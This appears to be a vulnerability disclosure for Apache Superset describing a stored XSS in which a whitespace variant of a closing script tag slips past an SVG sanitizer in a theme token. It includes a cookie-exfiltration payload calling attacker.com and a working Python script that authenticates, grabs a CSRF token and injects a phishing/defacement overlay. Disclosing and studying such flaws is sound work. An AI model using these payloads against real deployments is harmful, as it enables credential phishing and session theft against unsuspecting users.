# [Superset] Stored XSS via Regex Bypass in `sanitize_svg_content()` — `brandSpinnerSvg` Theme Token

---

### Summary

The `sanitize_svg_content()` function in `superset/utils/core.py` uses a regular expression that fails to match valid variants of the `</script>` closing tag containing whitespace (e.g. `</script >`). As a result, an admin can fully bypass the sanitization layer and inject an SVG payload containing a `<script>` block into the `brandSpinnerSvg` field of the theme configuration. The payload is persisted to the database, then rendered **unescaped** (`| safe`) into `spa.html` — the main SPA entry point — causing **every user** who visits Superset to execute the malicious JavaScript.

---

### Details

**Affected line:** `superset/utils/core.py:554`

```python
# sanitize_svg_content() — line 554
# Regex missing \s* before > in the closing tag
content = re.sub(
    r"<script[^>]*>.*?</script>",   # ← does NOT match "</script >"
    "",
    svg_content,
    flags=re.IGNORECASE | re.DOTALL
)
```

The payload survives the sanitizer intact, is stored in the database, and travels through the entire pipeline with no further guards:

```
Admin API request (theme config)
        │
        ▼
themes/schemas.py:35  sanitize_theme_tokens()
        │
        ▼
utils/core.py:554     sanitize_svg_content()   ← regex MISS, payload survives
        │
        ▼
DB (theme persisted)
        │
        ▼
views/base.py:626     spinner_svg = theme_tokens["brandSpinnerSvg"]
        │
        ▼
spa.html:126          {{ spinner_svg | safe }}  ← rendered RAW, no escaping
        │
        ▼
 XSS executed in ALL users' browsers
```

---

### PoC

**Step 1 — Verify sanitizer bypass:**

```python
from superset.utils.core import sanitize_svg_content

payload = "<script>fetch('https://attacker.com/?c='+document.cookie)</script >"

sanitized = sanitize_svg_content(payload)

print(sanitized)
# Output: "<script>fetch('https://attacker.com/?c='+document.cookie)</script >"
```

**Step 2 — Inject CSS payload via theme API (requires admin credentials):**

An authenticated admin POSTs a malicious theme to `/api/v1/theme/` with `brandSpinnerSvg` containing a crafted payload that escapes the SVG context and injects a `<style>` block:

```python
import requests
import json
import sys
# Local Superset Environment Configuration
SUPERSET_URL = "http://localhost:8088"
USERNAME = "admin"
PASSWORD = "admin"
def run_exploit():
    print(f"[*] Targeting Apache Superset at {SUPERSET_URL}...")
    session = requests.Session()
    # 1. Authenticate and obtain JWT Access Token
    login_data = {
        "username": USERNAME,
        "password": PASSWORD,
        "provider": "db"
    }
    try:
        login_res = session.post(f"{SUPERSET_URL}/api/v1/security/login", json=login_data)
        login_res.raise_for_status()
    except Exception as e:
        print(f"[!] Authentication failed: {e}")
        return
    access_token = login_res.json().get("access_token")
    if not access_token:
        print("[!] No access token found in login response.")
        return
    headers = {
        "Authorization": f"Bearer {access_token}",
        "Content-Type": "application/json",
    }
    # 2. Fetch CSRF Token
    csrf_res = session.get(f"{SUPERSET_URL}/api/v1/security/csrf_token/", headers=headers)
    if csrf_res.status_code != 200:
        csrf_res = session.get(f"{SUPERSET_URL}/api/v1/security/csrf_token", headers=headers)
    
    if csrf_res.status_code != 200:
        print(f"[!] Failed to obtain CSRF token. Status: {csrf_res.status_code}")
        return
    
    csrf_token = csrf_res.json().get("result")
    headers["X-CSRFToken"] = csrf_token
    # 3. Crafted CSS Phishing Payload
    # This payload uses a Regex Bypass ( trailing space in </script > ) to survive sanitize_svg_content() 
    # and CSP 'unsafe-inline' in style-src to perform UI Redressing.
    css_payload = (
        "<script >console.log('Regex bypass successful');</script >"
        "<style>"
        "  /* Hide the main application */"
        "  #app { display: none !important; }"
        "  /* Inject fake session expiry notice (UI Redressing) */"
        "  body { background: #000 !important; }"
        "  body::before {"
        "    content: 'SESSION EXPIRED.\\A\\AYour authentication token is no longer valid.\\A\\APlease re-login with administrator credentials to continue.\\A\\A[Fake Login Form Placeholder]';"
        "    display: flex; justify-content: center; align-items: center;"
        "    color: #ff3333; font-size: 20px; font-family: monospace;"
        "    white-space: pre-wrap; padding: 40px; border: 2px solid red;"
        "    background-color: #111; z-index: 10000;"
        "    position: absolute; top: 50%; left: 50%; "
        "    transform: translate(-50%, -50%); text-align: center;"
        "  }"
        "</style>"
    )
    theme_payload = {
        "theme_name": "Security_Notice_Theme",
        "json_data": json.dumps({
            "token": {
                "brandSpinnerSvg": f"<svg xmlns='http://www.w3.org/2000/svg'>{css_payload}</svg>"
            }
        })
    }
    # 4. Inject the malicious theme
    print("[*] Injecting malicious theme payload...")
    inject_res = session.post(
        f"{SUPERSET_URL}/api/v1/theme/",
        json=theme_payload,
        headers=headers
    )
    if inject_res.status_code in [200, 201]:
        print("[+] Success: Malicious theme injected into database.")
        print("[*] Trigger: Navigate to Settings -> CSS Templates and activate 'Security_Notice_Theme'.")
    else:
        print(f"[!] Injection failed. Status: {inject_res.status_code}")
        print(inject_res.text)
if __name__ == "__main__":
    run_exploit()
```

**Result:** Every user who loads the Superset SPA sees a full-page defacement overlay. The `<script >` tag (with trailing space) confirms the regex bypass in `view-source`, while the `<style>` block executes freely since `style-src` permits `'unsafe-inline'` without a nonce requirement.

---

### Impact

An attacker with **admin** privileges can inject arbitrary HTML/CSS into `brandSpinnerSvg`, which is rendered unescaped via `{{ spinner_svg | safe }}` on every page load for all users.

**Tested impact (local Docker build):** The default CSP includes a per-request `nonce-*` in `script-src`. Per CSP Level 3, when a nonce is present, `'unsafe-inline'` is ignored by compliant browsers — injected `<script>` blocks are blocked. However, `style-src` carries `'unsafe-inline'` without a nonce, so **CSS injection executes freely**. Demonstrated impact:

- **UI defacement** — overlay arbitrary content on top of the entire application for all users
- **Phishing surface** — replace the Superset UI with a fake login form using pure CSS/HTML
- **Persistence** — payload remains stored in the database until the theme is manually reset

In deployments where CSP is absent, misconfigured, or does not include a nonce, the same injection point allows **full JavaScript execution** (session hijacking, data exfiltration).


#### Note — CSP & Actual Test Result

The default Docker build ships the following CSP:

```
script-src 'self' 'unsafe-inline' 'unsafe-eval' 'nonce-fIEFIOmIqLXkQWYc5w_ZgNqjPsw0sMYk'
style-src  'self' 'unsafe-inline' ...
```

Despite `'unsafe-inline'` being listed in `script-src`, inline script injection **did not execute** during local testing (`alert(1)` blocked). This is expected behaviour under **CSP Level 3**: when a `nonce-*` source is present alongside `unsafe-inline`, compliant browsers (Chrome, Firefox) **ignore `unsafe-inline`** and require the correct nonce on any script tag. Since the injected `<script>` block cannot carry the server-generated nonce, it is blocked.

However, `style-src` carries `'unsafe-inline'` **without a nonce**, meaning **CSS injection executes freely**. The payload was adapted accordingly to demonstrate real impact via CSS:

```
Injected <style> block → hides #app → overlays full-page defacement via body::after pseudo-element
```

This confirms the vulnerability is reachable and produces visible, user-facing impact even without script execution. In environments with a weaker or absent CSP, the same injection point would allow full JavaScript execution.

---
### Credit 

- VulnhunterX - Verification Framework
